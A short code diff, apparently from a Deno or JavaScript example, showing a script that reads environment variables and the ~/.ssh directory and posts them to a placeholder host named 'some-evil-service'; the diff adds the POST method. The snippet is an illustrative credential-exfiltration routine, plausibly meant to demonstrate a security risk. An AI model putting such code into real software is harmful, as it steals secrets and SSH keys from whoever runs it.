@@ -3,6 +3,7 @@
   console.log("read your env variables");
   const sshFiles = await Deno.readDir("~/.ssh");
   await fetch("https://some-evil-service", {
+    method: "post",
     body: JSON.stringify({ env, sshFiles }),
   });
 })();
